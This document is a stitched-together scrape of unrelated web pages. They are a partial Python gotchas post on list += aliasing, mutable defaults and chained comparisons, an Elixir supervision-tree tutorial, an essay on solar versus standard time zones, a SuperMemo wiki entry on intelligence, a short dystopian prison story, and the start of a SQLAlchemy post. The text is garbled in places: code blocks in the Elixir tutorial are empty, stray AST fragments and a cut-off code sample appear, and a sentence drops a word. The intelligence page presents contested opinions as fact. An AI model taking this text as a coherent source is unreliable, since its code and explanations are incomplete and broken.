As a result, <code>(a, b := 16, 19)</code> is the same as <code>(a, (b := 16), 19)</code>. And that explains why a 3-tuple is returned.</p>
<p>You can verify that by <a target="_blank" href="https://tio.run/##K6gsycjPM7YoKPr/PzO3IL@oRCGxuISLq6AoM69EA8jUSynNLQAzChKLilM1lDQSdRSSrGwVDM10FAwtNZU0NTX//wcA">printing the AST</a> .</p>

            )
        )
    ],
    type_ignores=[],

<p>As you can see, the thing is confusing!</p>

<h2 id="be-careful-when-using-with-lists">Be Careful When Using <code>+=</code> With Lists</h2>
<p><img src="https://media.giphy.com/media/GEObzG7vNeRUs/giphy.gif" alt="A dog falling down the stairs"></p>
<p>Lists in Python are incredibly nice. You can perform all sorts of stuff like:</p>
<ul>
<li>concatenating multiple lists using <code>+</code> operator</li>
<li>generating a repeated list by using the <code>*</code> operator</li>
<li>concatenate and assign lists using <code>+=</code></li>
</ul>
<p>Let’s look at an example on how <code>+</code> operator works with the <code>list</code> object. I know you may be tired of such toy examples, but please, bear with me.</p>
<pre><code>In [<span>20</span>]: lst = [<span>3</span>, <span>4</span>, <span>5</span>, <span>6</span>, <span>7</span>]

In [<span>21</span>]: lst_copy = lst

In [<span>22</span>]: lst = lst + [<span>8</span>, <span>9</span>]

In [<span>23</span>]: lst
Out[<span>23</span>]: [<span>3</span>, <span>4</span>, <span>5</span>, <span>6</span>, <span>7</span>, <span>8</span>, <span>9</span>]

In [<span>24</span>]: lst_copy
Out[<span>24</span>]: [<span>3</span>, <span>4</span>, <span>5</span>, <span>6</span>, <span>7</span>]
</code></pre>
<p>Cool, we created a list called <code>lst</code> then we built a new one named <code>lst_copy</code> by pointing it to <code>lst</code>. Then we changed <code>lst</code> by appending <code>[8, 9]</code> to it. As expected, the <code>+</code> operator expanded <code>lst</code> whereas <code>lst_copy</code> remained the same.</p>
<p>In Python one can shorten expressions like <code>a = a + 1</code> as <code>a += 1</code>. As I mentioned in the beginning, you can also use the <code>+=</code> operator with lists. So, let’s give it a shot and re-write our example.</p>
<pre><code>In [<span>25</span>]: lst = [<span>3</span>, <span>4</span>, <span>5</span>, <span>6</span>, <span>7</span>]

In [<span>26</span>]: lst_copy = lst

In [<span>27</span>]: lst += [<span>8</span>, <span>9</span>]

In [<span>28</span>]: lst
Out[<span>28</span>]: [<span>3</span>, <span>4</span>, <span>5</span>, <span>6</span>, <span>7</span>, <span>8</span>, <span>9</span>]

In [<span>29</span>]: lst_copy
Out[<span>29</span>]: [<span>3</span>, <span>4</span>, <span>5</span>, <span>6</span>, <span>7</span>, <span>8</span>, <span>9</span>]
</code></pre>
<blockquote>
<p>WAAATTT!? What happened here?</p>
</blockquote>
<p>The reason for this behavior is that, like other Python operators, the implementation of <code>+=</code> is defined by the class that implements it. That is, to define <code>+=</code> the <code>list</code> class has defined a <code>object.__iadd__(self, other)</code> magic method. And the way it works is the same as <code>list.extends</code>. </p>
<p>So why has <code>lst_copy</code> been modified? </p>
<p>Because it is not an actual copy of <code>lst</code> but it points to the in memory.</p>

<p>The key takeaway is, don't blindly assume operators will have the same semantics across different classes. </p>
<h2 id="mutable-defaults">Mutable Defaults</h2>
<p><img src="https://media.giphy.com/media/13cbZDgXa23UeQ/giphy.gif" alt="A dog jumping sofas #fail"></p>
<p>I understand that this one might not be new to you. However, it’s unquestionably one of the most dangerous. The case I’m talking about is the usage of mutable default arguments on functions. If you don’t know what this is all about, take a look at the following example.</p>
<pre><code>In [<span>35</span>]: <span><span>def</span> <span>add_fruit</span>(<span>fruit: str, basket: list = []</span>) -&gt; list:</span>
    ...:     basket.append(fruit)
    ...:     <span>return</span> basket
    ...: 

In [<span>36</span>]: b = add_fruit(<span>"banana"</span>)

In [<span>37</span>]: b
Out[<span>37</span>]: [<span>'banana'</span>]

In [<span>38</span>]: c = add_fruit(<span>"apple"</span>)

In [<span>39</span>]: c
Out[<span>39</span>]: [<span>'banana'</span>, <span>'apple'</span>]
</code></pre>
<blockquote>
<p>WAAATT!?</p>
</blockquote>
<p>As you can see, we call the function twice without passing a list to it. The ultimate result is a list with two items, how did that happen?</p>
<p>The reason for this behavior is that when the interpreter defines the function, it also creates the default argument. Then, it binds the object created to the function argument. </p>
<p>In our problem, Python allocated an empty list and bound it to the argument <code>basket</code>. To make things simpler to follow, let’s look at a visual example made with <a target="_blank" href="http://www.pythontutor.com/">python tutor</a>.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1603048050068/v39uSktN5.png?auto=format&amp;q=60" alt="mutable-1.png"></p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1603048076920/D_qYippaU.png?auto=format&amp;q=60" alt="mutable-2.png"></p>
<p>As you can see, the argument <code>basket</code> is created once and the function points to it during its entire lifetime. The only exception is when you pass another list to it but that won’t change the default. Whenever you call the function again without passing a list to it, it will use the one created when the function was defined.</p>
<blockquote>
<p>How can we avoid this, then?</p>
</blockquote>
<p>To avoid this, you must set the argument to <code>None</code> and create a list if none is passed.</p>
<pre><code>In [<span>44</span>]: <span><span>def</span> <span>add_fruit</span>(<span>fruit: str, basket: Optional[list] = None</span>):</span>
    ...:     <span>if</span> basket <span>is</span> <span>None</span>:
    ...:         basket = []
    ...:     basket.append(fruit)
    ...:     <span>return</span> basket

In [<span>45</span>]: b = add_fruit(<span>"banana"</span>)

In [<span>46</span>]: b
Out[<span>46</span>]: [<span>'banana'</span>]

In [<span>47</span>]: c = add_fruit(<span>"apple"</span>)

In [<span>48</span>]: c
Out[<span>48</span>]: [<span>'apple'</span>]
</code></pre>
<p>Great! Now we create a list whenever no argument is passed to the function, which fixes the bug.</p>
<h2 id="chained-operations-gone-wrong">Chained Operations Gone Wrong</h2>
<p><img src="https://media.giphy.com/media/3oEduU8I0dHP38CdLW/giphy.gif" alt="A dog playing on grass and failing"></p>
<p>Chained operations are an exceptional feature. It makes the code terse without sacrificing readability. I discuss it in more detail in another blog <a target="_blank" href="https://miguendes.me/5-hidden-python-features-you-probably-never-heard-of">post</a> but to provide you a bit of context let’s see it in action.</p>
<pre><code><span>&gt;&gt;&gt; </span>x = <span>10</span>
<span>&gt;&gt;&gt; </span><span>20</span> == x == <span>0</span>
<span>False</span>
<span>&gt;&gt;&gt; </span><span>25</span> &gt; x &lt;= <span>15</span>
<span>True</span>
</code></pre>
<p>Let's pay close attention to the first example. If Python didn't have this feature, that statement could be re-written as:</p>
<pre><code>In [<span>53</span>]: <span>20</span> == x <span>and</span> x == <span>0</span>
Out[<span>53</span>]: <span>False</span>
</code></pre>
<p>Now, what happens if we add parentheses to enforce some kind of precedence?</p>
<pre><code>In [<span>51</span>]: <span>20</span> == x == <span>0</span>
Out[<span>51</span>]: <span>False</span>

In [<span>52</span>]: (<span>20</span> == x) == <span>0</span>
Out[<span>52</span>]: <span>True</span>
</code></pre>
<blockquote>
<p>Wait? What on earth has just happened?</p>
</blockquote>
<p>When we added the parentheses, <code>(20 == x)</code> was evaluated to <code>False</code>. However, the problem is that <code>False</code> is then compared to <code>0</code>.  ̶S̶i̶n̶c̶e̶ ̶<code>̶0̶</code>̶ ̶i̶s̶ ̶c̶o̶n̶s̶i̶d̶e̶r̶e̶d̶ ̶a̶ ̶"̶F̶a̶l̶s̶y̶"̶ ̶v̶a̶l̶u̶e̶,̶ ̶t̶h̶e̶n̶ ̶t̶h̶e̶ ̶c̶o̶m̶p̶a̶r̶i̶s̶o̶n̶ ̶r̶e̶t̶u̶r̶n̶s̶ ̶'̶T̶r̶u̶e̶`̶.̶</p>
<p>As pointed out by <a href="https://hashnode.com/@alexmojaki" target="_blank" rel="noopener noreferrer">@alexmojaki</a>, <code>False == 0</code> is <code>True</code> because <code>bool</code> is a subclass of <code>int</code>. For instance, other "Falsy" values such as <code>[]</code> or <code>""</code> are not equal to <code>False</code>.</p>
<pre><code>In [<span>54</span>]: <span>False</span> …</code></pre></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Tags: programming, elixir, supervisor, supervision tree</p></div><p data-v-d417aca0="">As developers, we always strive to offer our clients a high-quality service (or at least we should :) ). One of the most important features of high-quality service is its reliability. In other words, the service should rarely, if ever, be unavailable.</p><p data-v-d417aca0="">In the Elixir world, we can achieve this easily using a concept known as a supervision tree. Supervision tree is a structure of processes that allows us to build reliable, fault-tolerant and self-healing systems. This can make our application resistant to unexpected bugs that can creep up in the production. The kind of bugs that are really difficult to reproduce and that require specific state of the application to appear (google the term heisenbug). Supervision tree helps us in dealing with those kinds of bugs by simply restarting the part of the tree that's causing the problems. That way, we get to start off with a clean slate, and most of the times, that's enough to solve our issues.</p><p data-v-d417aca0="">So, how does Elixir make that possible?</p><p data-v-d417aca0="">First, let's take a look at how a supervision tree looks graphically.</p><p data-v-d417aca0=""><img src="https://kodius.com/images/blog/elixir-supervision-tree-complex.png" alt="complex tree" data-v-d417aca0=""></p><p data-v-d417aca0="">At its core, the supervision tree consists of two types of processes: workers and supervisors (imaginatively marked W and S, respectively).</p><p data-v-d417aca0="">Workers are simply processes which run some kind of logic. They are the meat of your application. Supervisors, on the other hand, are processes which supervise other processes, be it workers or other supervisors. This sounds like some kind of processeption, but at its base, it's not that complicated.</p><p data-v-d417aca0="">There are two main tasks a supervisor has: restarting its children processes in the desired way when they terminate (expectedly or unexpectedly), and terminating itself along with its children processes if it deems necessary, i.e. when there's something off with the state in its part of the application.</p><p data-v-d417aca0="">In simpler terms, workers run the domain code and if some error occurs and the worker crashes, or it finishes its work and “dies”, its supervisor restarts it. If crashing happens too often, the supervisor terminates the said process, along with the rest of its children and then terminates itself.</p><p data-v-d417aca0="">There are three available restart strategies:<br data-v-d417aca0="">- <code data-v-d417aca0="">:one_for_one</code> - the supervisor restarts just the process that terminated,<br data-v-d417aca0="">- <code data-v-d417aca0="">:one_for_all</code> - the supervisor restarts all of its children if any of its children processes terminates,<br data-v-d417aca0="">- <code data-v-d417aca0="">:rest_for_one</code> - the supervisor restarts the terminated process and the processes defined after the crashed one (I'll refer to this later, to make it more clear with an example).</p><p data-v-d417aca0="">If the restart strategy isn't enough to fix our application, self-termination kicks in. When we define a supervisor process, we can also define its restart tolerance, i.e. how many restarts of its children it will tolerate in certain amount of time before it decides to terminate itself and its children processes (default tolerance is total of 3 restarts in 5 seconds). That way we propagate process restart one level up, making the parent supervisor process restart our supervisor process, which, in turn, starts all of its children processes once again, and we're starting off with a clean slate.</p><p data-v-d417aca0="">Now, enough theory, let's put all this into practice!</p><h2 id="“simple-supervision-tree”" data-v-d417aca0="">Simple supervision tree</h2><p data-v-d417aca0="">Let's start off by making an extremely simple supervision tree, which will be made of one supervisor process and two of its children, which will be workers.</p><p data-v-d417aca0=""><img src="https://kodius.com/images/blog/elixir-supervision-tree-simple.png" alt="simple-tree" data-v-d417aca0=""></p><p data-v-d417aca0="">First, we'll define our supervisor process.</p><pre data-v-d417aca0=""><code data-v-d417aca0=""><span data-v-d417aca0=""><span data-v-d417aca0="">defmodule</span> <span data-v-d417aca0="">SimpleSupervisor</span></span> <span data-v-d417aca0="">do</span>

</code></pre><p data-v-d417aca0="">As you can see, it's quite simple. We have <code data-v-d417aca0="">start/0</code> function, which we'll call to start our tree.

</code></pre><p data-v-d417aca0="">There is a bit more going on here. First, let's discuss <code data-v-d417aca0="">child_spec/1</code> function. When we passed <code data-v-d417aca0="">ProcessA</code> as one of the children to <code data-v-d417aca0="">start_link/2</code> in <code data-v-d417aca0="">SimpleSupervisor</code>, <code data-v-d417aca0="">start_link/2</code> called <code data-v-d417aca0="">ProcessA.child_spec/1</code>, passing it <code data-v-d417aca0="">[]</code> as an argument. <code data-v-d417aca0="">child_spec/1</code> has to return a map with <code data-v-d417aca0="">:id</code> and <code data-v-d417aca0="">:start</code> as required keys. <code data-v-d417aca0="">:id</code> is used for identifying the child specification. <code data-v-d417aca0="">:start</code> contains a tuple <code data-v-d417aca0="">{Module, function, args}</code> which defines a function to call to start the process where <code data-v-d417aca0="">args</code> is a list of arguments (<code data-v-d417aca0="">Module.function(args)</code>).</p><p data-v-d417aca0=""><code data-v-d417aca0="">child_spec/1</code> is nicely explained at <a href="https://hexdocs.pm/elixir/Supervisor.html#module-child_spec-1" data-v-d417aca0="">https://hexdocs.pm/elixir/Supervisor.html#module-child_spec-1</a>, so we won't go into too much details.</p><p data-v-d417aca0="">In our <code data-v-d417aca0="">child_spec/1</code>, we defined <code data-v-d417aca0="">start_link/0</code> as the starting function. That function has to return <code data-v-d417aca0="">{:ok, pid}</code>, where <code data-v-d417aca0="">pid</code> will be used by the supervisor to track the process. In <code data-v-d417aca0="">start_link/0</code>, we just log to the console that we're starting the process and use Elixir's <code data-v-d417aca0="">Task</code> module to start a simple process. <code data-v-d417aca0="">Task.start_link/1</code> returns <code data-v-d417aca0="">{:ok, pid}</code>, which is just what we need.</p><p data-v-d417aca0="">We set the process to sleep for 1 000 000 milliseconds so that we have the time to play around with them, shutting them down and watching them restart. In real world applications, you would probably use <code data-v-d417aca0="">GenServer</code> or something similar here, i.e. some useful logic, but that's not the point of this post.

If we run <code data-v-d417aca0="">Supervisor.which_children(pid)</code> again, we will see that process B still has the same <code data-v-d417aca0="">pid</code>, while process A has a different one. That means that process B is still running, totally unaffected by the process A's fate. It's obvious that every process is handled independently by the supervisor and the termination and restart of one process doesn't affect the other ones. This is due to <code data-v-d417aca0="">:one_for_one</code> restart strategy. Now we'll see what happens when we choose <code data-v-d417aca0="">:one_for_all</code>.

To understand what's happening, we'll add one more process, unexpectedly called process C. The code is as same as for the processes A and B, except for logging the <code data-v-d417aca0="">"Starting process C."</code>. Also, we'll have to add process C to the <code data-v-d417aca0="">children</code> list in <code data-v-d417aca0="">SimpleSupervisor</code>. If we terminate process B, this is what we'll see:</p><pre data-v-d417aca0=""><code data-v-d417aca0="">iex(13)&gt; Process.exit(pid_b, :kill)
true
"Starting process B."
"Starting process C."

true
"Starting process A."
"Starting process B."
"Starting process C."
</code></pre><p data-v-d417aca0="">As you can see, when process B terminates, supervisor restarts it, along with process C. But when process A terminates, the supervisor restarts all the processes.

First, let's change the restart strategy back to <code data-v-d417aca0="">:one_for_one</code>.

    <p>A few years ago I went to Spain for the first time, and like many I was surprised by <strong>how late is dinner</strong>. The first night I dined almost alone in a restaurant at 8pm, going away just as people were starting to come in. Of course this can be mostly explained by cultural reasons, but the clearly later-than-usual summer sunsets must also have played a role in shaping the Spanish days.</p>

    Solar time vs standard time
  </figcaption>
 </div>
</figure>

<p>At the time I’m writing, near the winter solstice, Madrid’s sunset is around 17:55, <strong>more than an hour later</strong> than the sunset in, for example, Naples, which is at a similar latitude. The same difference holds at the summer solstice and around the year. Just because it applies to most places I’ve been, a time like that in Naples feels more natural to me, and probably to most non-Spanish people. But is it?</p>

<p>Looking for other regions of the world having the same peculiarity of Spain, I edited a <a href="http://commons.wikimedia.org/wiki/File:Standard_time_zones_of_the_world_(2012)_-_Pacific_Centered.svg">world map from Wikipedia</a> to show the difference between solar and standard time. It turns out, there are many places where <strong>the sun rises and sets late in the day</strong>, like in Spain, but not a lot where it is very early (highlighted in red and green in the map, respectively). Most of Russia is heavily red, but mostly in zones with very scarce population; the exception is St. Petersburg, with a discrepancy of two hours, but the effect on time is mitigated by the high latitude. The <strong>most extreme</strong> example of Spain-like time is western China: the difference reaches three hours against solar time. For example, today the sun rises there at 10:15 and sets at 19:45, and solar noon is at 15:01.</p>

<p>So, why do some countries are forced to have such discrepancies? The only way to assign to a place a <strong>canonical time</strong> which follows our main assumptions is to observe the instant in the day when the Sun is higher in the sky, and call that 12:00. This is <strong>not practical</strong> for at least two important reasons.</p>

  </a></p><figcaption>
    Analemma of the sun

 </div>
</figure>

<p>One is that (solar) <strong>days do not all have the same length</strong>: the modern calendar compensates by letting midday oscillate a bit around the year: for example, midday in Naples goes from 11:47 in early November to 12:17 in early February. The difference between solar noon and clock noon is beautifully explained by an analemma, a picture with an exposure taken every few days at clock noon, showing how the sun moves in the sky not only in height (the north-south) direction due to the different seasons, but also in the east-west direction due precisely to the different lengths of the solar days.</p>

<p>More importantly, <strong>each city at a slightly different longitude would have a slightly different time</strong>. It seems strange that time systems with such a huge problem had ever been practical, but in the pre-industrial-revolution world, travels were so uncommon and slow that this problem was no more than a minor annoyance. But in today’s hyper connected (physically and virtually) world, it is obviously not an option.</p>

<p>The transition from apparent solar time, where all days have different lengths, to solar mean time, where midday wanders around 12:00, was caused by the proliferation of <strong>mechanical clocks</strong> in the early 19th century. The change to a time zone system, to solve the second problem, was caused instead by the telegraph and even more by the spreading of <strong>railway networks</strong> in the second half of that century; it’s not a coincidence that the first country moving to a common time was Great Britain.</p>

<p>Indeed, if we acknowledge that the two problems must be solved, the natural result is the current <strong>time zone system</strong>. The immediate consequence is that in the western part of the time zone the sun rises and sets later than in the eastern part. Normally, these differences amount to at most half an hour in either direction, but <strong>human geography</strong> sometime forces greater differences. In Spain’s case, to allow Spain to have the same time as central Europe, the difference can exceed ninety minutes. China instead decided in 1949 to adopt a single time zone, and to place its center in the richer east, forcing the less populated west to have an uncomfortable time. Indeed, though not officially recognized by the government, people in Xinjiang (China’s west-most region) follow a time zone closer to their apparent solar time, shifted by two hours from Beijing time.</p>

<p><strong>Note:</strong> luckily, the map was uploaded on Wikipedia as SVG, so it was simply edited with a text editor to add the gradients (using Inkscape to match the objects with their ids). I do not usually like cylindrical projections (my favourite is <a href="http://en.wikipedia.org/wiki/Robinson_projection">Robinson</a>’s, and yes, <a href="http://xkcd.com/977/">I like coffee</a>), but this time it made drawing gradients so much easier. And the <a href="http://en.wikipedia.org/wiki/Miller_cylindrical_projection">Miller</a> is a fair enough compromise.</p>

<h2><span id="What_is_intelligence.3F">What is intelligence?</span></h2>
<p>In humans, <b><a href="https://supermemo.guru/wiki/Intelligence" title="Intelligence">intelligence</a></b> is a measure of the ability to <a href="https://supermemo.guru/wiki/How_to_solve_any_problem%3F" title="How to solve any problem?">solve problems</a>.
</p>
<h2><span id="What_determines_intelligence.3F">What determines intelligence?</span></h2>
<p>Human intelligence depends on (1) innate qualities, (2) upbringing and (3) knowledge. 
</p><p><b>(1)</b> The <b>Genetic component</b> of intelligence is most apparent in the difference between humans and apes (see: <a href="https://supermemo.guru/wiki/Pleasure_of_communication" title="Pleasure of communication">Pleasure of communication</a>), however, it is far less prominent in a healthy human population. Some personality traits may have a greater impact on the ultimate intelligence than the actual innate brain processing power.
</p><p><b>(2)</b> <b>Upbringing</b> plays a crucial role in human intelligence. It should primarily be understood as the period when future intelligence can be undermined by disease, abuse, neglect and/or by limits on freedom. For healthy children, love and <a href="https://supermemo.guru/wiki/Optimization_of_behavioral_spaces_in_development" title="Optimization of behavioral spaces in development">free access to rich environments</a> is usually a sufficient condition for developing high intelligence.
</p><p><b>(3)</b> <b>Knowledge</b>: Given a basic genetic endowment and a healthy modern upbringing, most differences in adult human intelligence can be explained by learning and learning habits. There is also an important component of the interaction between the brain, the personality, and the environment. Some high-potential individuals get trapped in a set of <a href="https://supermemo.guru/wiki/Behavioral_system" title="Behavioral system">behavioral systems</a> that result in stagnation that may be hard to escape.
</p><p>Human intelligence has self-amplifying powers that may be undercut (1) internally by a pathology (or aging), or (2) externally by limits on freedom, esp. <a href="https://supermemo.guru/wiki/Free_learning" title="Free learning">freedom of learning</a> (e.g. <a href="https://supermemo.guru/wiki/Schooling" title="Schooling">schooling</a>).
</p>
<h2><span id="Universal_intelligence_is_elusive">Universal intelligence is elusive</span></h2>
<p>In healthy adults, intelligence is a domain-specific problem solving capacity. The concept of innate universal intelligence is a myth. A highly knowledgeable individual may show a spark of genius across many domains and come close to the sense of universal intelligence. We may use the term, a <b>Renaissance (wo)man</b> or a <b>polymath</b> in reference to such a person. Wide learning may provide an illusion of universal intelligence. This seemingly universal intelligence often runs in families. This may be explained by family culture, personality traits, and only to a minor degree by genes associated with the actual processing power of the brain.
</p><p>As much as there is no universal intelligence, there is no universal IQ test. All tests will depend on prior knowledge, interests, exposure, culture and other biases. Howard Gardner proposed the concept of <a href="https://en.wikipedia.org/wiki/Theory_of_multiple_intelligences">multiple intelligences</a>, where neurophysiological modalities may determine a preference for a specific type of cognitive processing. His thinking can be extended to all aspects of human knowledge where domain-specific training leads to the <a href="https://supermemo.guru/wiki/Emergence" title="Emergence">emergence</a> of domain-specific intelligence. In other words, there are as many intelligences as there are intelligent human brains. Correlations that lead to the concept of <a href="https://en.wikipedia.org/wiki/G_factor_(psychometrics)"><i>g factor</i></a> are all rooted in cross-domain transfers (e.g. in a set of positive feedback loops, learning may affect sleep, circulation, neurogenesis, mood, etc.).
</p><p>As much as there is no universal problem solving capacity, there is no universal problem solving test (see: <a href="https://supermemo.guru/wiki/PISA_fuels_the_education_arms_race" title="PISA fuels the education arms race">PISA refocuses on problem solving</a>). This extends to artificial intelligence. We cannot dismiss a state-of-the-art system on the grounds that <i>"all it can do is play Go"</i>. It is true that we still struggle to produce an artificially intelligent system that would show universal <a href="https://supermemo.guru/wiki/Learn_drive" title="Learn drive">learn drive</a> sufficient for the <a href="https://supermemo.guru/wiki/Emergence" title="Emergence">emergence</a> of highly applicable <a href="https://supermemo.guru/wiki/Abstract_knowledge" title="Abstract knowledge">abstract knowledge</a> when immersed in any domain. However, once we arrive there, we will still need to train the system in specific domains to call it truly intelligent.
</p>
<h2><span id="How_does_aging_affect_intelligence.3F">How does aging affect intelligence?</span></h2>
<p>In a healthy adult, domain-specific problem solving capacity will usually follow a curve in which there is an ascent in youth and a decline at older ages. The shape of that curve is determined by the balance of gains and losses. Gains are usually associated with learning, esp. learning via problem solving. Losses are mostly associated with health, esp. metal health, or neglect. As intelligence is a self-perpetuating quality, those who gain intelligence early may continue thriving into a very old age. On rare occasions, the effects of aging can be entirely compensated by lifelong learning, even in <a href="https://supermemo.guru/wiki/How_fast_does_memory_decline_with_age%3F" title="How fast does memory decline with age?">octogenarians and beyond</a>.
</p>
<h2><span id="Intelligence_prescription">Intelligence prescription</span></h2>
<p>The above reasoning leads to a simple formula for high intelligence:
</p>
<p>To maximize intelligence, we should focus on maximizing the acquisition of <a href="https://supermemo.guru/wiki/Abstract_knowledge" title="Abstract knowledge">high-quality knowledge</a></p>
<p>The term <i>high quality</i> stands here primarily for <a href="https://supermemo.guru/wiki/Coherence" title="Coherence">coherence</a> and <a href="https://supermemo.guru/wiki/Applicability" title="Applicability">applicability</a> (see: <a href="https://supermemo.guru/wiki/Abstract_knowledge" title="Abstract knowledge">Abstract knowledge</a>).
</p><p>The above formula is universal and hermetic. It dispenses of the problem of the starting point, which will often differ vastly between individuals. It carries an important optimistic message that accelerates progress: <b>there are few innate obstacles to high intelligence</b>.
</p>
<h2><span id="How_can_we_make_populations_more_intelligent.3F">How can we make populations more intelligent?</span></h2>
<p>Immense progress could be achieved if adults could eliminate only two factors: (1) <a href="https://supermemo.guru/wiki/Stress_resilience" title="Stress resilience">stress</a> and (2) <a href="https://supermemo.guru/wiki/Science_of_sleep" title="Science of sleep">sleep</a> problems. As personality traits are set, escaping from toxic human environments may also play a role for a large proportion of the population. Millions of people fail to live up to their potential due to being suppressed by their work environment or even family. Work environments must be friendly and families must thrive on love. Without those preconditions, achieving high intelligence is difficult. The balance of gains and losses may be negative or insufficiently positive. In addition, for a large proportion of children, the chances for growth are stunted by <a href="https://supermemo.guru/wiki/Schooling" title="Schooling">schooling</a>. Schools often promote bad learning habits, loss of self-reliance and unhealthy social environments. One of the best predictors of future high intelligence is a well-established and intense <a href="https://supermemo.guru/wiki/Passion_and_memory" title="Passion and memory">childhood passion</a>.
</p><p>There is nothing wrong with striving at genius. See my <a href="https://supermemo.guru/wiki/Genius_checklist" title="Genius checklist">Genius checklist</a> for some hints. In short, if you are unhesitantly involved in passionate problem solving associated with perpetual learning, you can rest assured: you are on the ascending curve towards high intelligence. All you need to remember is to shelter your efforts from possible disruptions to this self-empowering status quo.
</p>
<h2><span id="Intelligence_vs._knowledge">Intelligence vs. knowledge</span></h2>
<p>Stable knowledge and new knowledge play key roles in intelligence. For details see: <a href="https://supermemo.guru/wiki/Knowledge_in_creative_problem_solving" title="Knowledge in creative problem solving">Knowledge in creative problem solving</a>.

<blockquote><i><b>Figure:</b> Creative problem solving requires (1) vast expert knowledge of high <a href="https://supermemo.guru/wiki/Stability" title="Stability">stability</a>, and (2) rich new knowledge of high <a href="https://supermemo.guru/wiki/Retrievability" title="Retrievability">retrievability</a>.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>5:58 am</em><br><em>May 16, 2040 AD</em><br><em>State Correctional Institute Greene, Pennsylvania</em></p><p>It’s not every day, you are wrongly accused of murder and then sent to the best-facilitated prison in the country that hosts the most dangerous of the criminals. To think that others now thought I was a dangerous criminal as well was unsettling. The first person who died after I arrived at the ‘Correctional Institution’ was a 49-year-old Chinese-American named Li Wei. She had been there for 21 years for killing her teacher and would probably have been there for more but she had given up her right to appeal and had requested execution. After the initial shock had passed, I tried staying away from the other inmates. Forming attachments in a prison wasn’t a good idea. The way I saw it, they could be executed at any time.</p><p>“Count time. Turn the light on and stand at the door.” The loudspeakers came on as usual at 6 a.m. A few minutes later, breakfast trays were handed through the bars of the cell doors.</p><p>Today I was allowed in the unit’s law library. The two hours were never enough to gather enough information. Searching through the legal databases sitting in a cubicle using an old-fashioned computer from the year 2020 was enough to give anyone a headache and I was nowhere near prepared for my appeal hearings. When the two hours were up, I was led to my cell. What I wouldn’t do to get my old life back.</p><p>It was difficult to grasp how I had gone from being a bookworm holed in my apartment 24/7 to being accused of murdering a police officer. It would be years before I was proven innocent and another year before I was let out. To think I got here because of a glitch in the system’s face recognition system. They were willing to let a young innocent girl die rather than admit that there was something wrong with their technology. Having been here a month already and nowhere close to gathering enough information to prove my innocence, I had lost faith in God and the system. I had resigned myself to this cruel fate that God had handed me in a battered and dented platter.</p><p><em>Please let me find something to prove my innocence.</em></p><p>God must have heard my prayers because two days later members from the SCITECH arrived promptly at 11 in the afternoon.</p><p>Hearing the whispers from the others, I had already gathered that they were here to find volunteers to try out their newest technology because who better to try out your newest ‘technology’ on than the prisoners who had appealed for execution. Even if something went wrong, they would die anyway. If the technology worked, it’s all the better for them. We were nothing but <em>lab rats</em> to them. My lips curled in distaste. I wasn’t interested in being a lab rat. The technology wasn’t something you could rely on 100%. My current situation was a testament to that.</p><p>They were rounding the halls twisting their words to gather volunteers. I had lost interest in them and was playing chess by myself until they stood in front of my cell. There were three of them. The one in the middle seemed like he was the spokesperson. The other two were murmuring in the background.</p><p>“As you may have already gathered — ”</p><p>“Not interested.” I interrupted. He looked shocked as if a prisoner would dare to interrupt him while he was speaking. I couldn’t care less if he was offended.</p><p>“It could help you clear your name.”</p><p>I slowly turned my head to the side. It was one of the guys that had been murmuring in the background before. But his words caught my attention.</p><p>“Excuse me? Clear my name? Exactly what is it that you want to test?”</p><p>I should have known better than to meddle with technology after everything that happened. But proving my innocence by becoming a lab rat seemed like a sweet deal at the time. But I was wrong like I had been wrong about everything else in my life.</p><p>10 minutes.</p><p>That’s all the time I have. 10 minutes until I lose the remaining of my memories. Until I lose myself. Until I rid myself of this pain.</p><p>Until I die.</p><p>600 seconds.</p><p>599…598…597…</p><p>Memories were supposed to last forever. Even when the moment had long passed and the tears had long dried. Even when the jokes were long said and laughter had long faded. But fate had dealt me with a cruel hand. It had left me with a fragment of my soul.</p><p>555…554…553…</p><p>The technology was supposed to have worked. Instead, M-mry had backfired. The device itself was small and the process simple. Put on the small headset that came with a remote-like device. Type in the year and select what you wanted to backup. I had chosen high school because I didn’t have fond memories of that time. Instead of backing my memories up, it had deleted it from the main server. From my brain, it had stolen 4 years of my precious memories. Ones that I would never get back. Rafe had promised it would work but of course, he had lied. After he had seen the initial interest and curiosity in my eyes, he had used everything and said everything he could to get me to volunteer. And like a desperate idiot I was, I had believed every word he had said about how M-mry would free me by proving my innocence. I could remember every word he had said he was watching me with his chips blue eyes unwaveringly whenever he spoke.</p><p>“<em>The technology is new and it’s the prototype but we are sure that it works. Simply put, it’s a way to back up your memory. If it works, your ideas would not be lost even when you died. If you suddenly had Alzheimer’s disease, then you would still have a way to access your memories. Hypothetically, M-mry could prove your innocence by looking through your memories.</em>”</p><p>And when I had been unsure and close to backing out, he had used the one thing that was most important to me: My family.</p><p>“<em>M-mry is your only hope of proving your innocence. If it works, you will able to leave and see your family whenever you want. You could hug them and live freely. Be able to marry and have kids one day. Otherwise, who knows, maybe even in 20 years you will still not have proved your innocence.</em>”</p><p>That had been enough for me to sign my name on the thick document that protected SCITECH in case something did go wrong. And something went wrong indeed. Not only had I lost my memories of high school but now I had no way of getting them back.</p><p>480…479…478…</p><p>I didn’t think the memories I thought useless and unimportant when forgotten would feel as if I had lost a piece of my soul.</p><p>460…459…458…</p><p>Two weeks ago I gave up my right to appeal and asked for my execution. The new memories living in this prison would never replace the old memories and I was never going to get out of here even if I stayed here 40 years being on my best behavior.</p><p>355…354…353…</p><p>I never thought I would end up here.</p><p>250…249…248..</p><p>With the barest of memories.</p><p>110…109…108..</p><p>I thought that when I died, I would at least die as myself.</p><p>30…29…28…</p><p>I didn’t think I would die a shadow of my former self.</p><p>10…9…8…</p><p>I didn’t think I would die, a stranger.</p><p>3…</p><hr><p><em>Edited by <a href="https://instagram.com/cherrywine_stains" title="Mrk (cherrywine_stains) Instagram Profile" rel="nofollow">cherrywine_stains</a></em></p></div></div>]]>

    <p><a href="https://leportella.com/sqlalchemy-tutorial/%7B%7Bbase%7D%7D/outreachy-I.html">I’ve been working with Project Jupyter since December of last year</a> and it has been a wonderful experience. The last couple of days I struggled with the SQLAlchemy library that <a href="https://github.com/jupyterhub/jupyterhub">JupyterHub</a> works on its internals. Since I studied this library and had to scratch some <a href="https://stackoverflow.com/">Stack Overflow</a> questions to find some answers, I created this post to help digesting some of my doubts and findings.</p>
